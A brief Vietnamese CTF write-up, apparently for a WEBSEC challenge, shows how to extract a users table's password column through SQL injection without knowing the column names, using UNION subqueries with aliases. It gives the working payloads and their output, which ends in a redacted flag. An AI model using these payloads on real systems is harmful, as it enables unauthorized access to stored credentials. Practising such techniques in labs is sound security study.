# SQLi bypass với alias


Lấy ý tưởng từ [bài viết](https://tsublogs.wordpress.com/2017/06/07/pentest-qa-cung-tsu-5-sql-injection-without-information_schema/) của một đàn anh người Việt.

-> Ta có thể sqli mà không cần đến column name của table hiện tại (users).

Thử payload:

`4 UNION SELECT a, c FROM (SELECT 4 AS a, 4 AS b, 4 AS c UNION SELECT * FROM users)`

Kết quả:
```
Username for given ID: not_your_flag

Other User Details:
id -> 0
login -> not_your_flag
```

Đại khái có thể hiểu là ta đang `UNION SELECT id, password from users` nhưng khác ở chỗ table mới này sẽ có thêm record (4, 4, 4) ở đầu.

Dễ thấy password không nằm ở record có `id = 0` không thỏa, tiếp tục thử với `id = 1`

`4 UNION SELECT a, c FROM (SELECT 4 AS a, 4 AS b, 4 AS c UNION SELECT * FROM users) where a between 1 and 1`

Kết quả:
```
Username for given ID: WEBSEC{REDACTED}

Other User Details:
id -> 1
login -> WEBSEC{REDACTED}
```

DONE!!!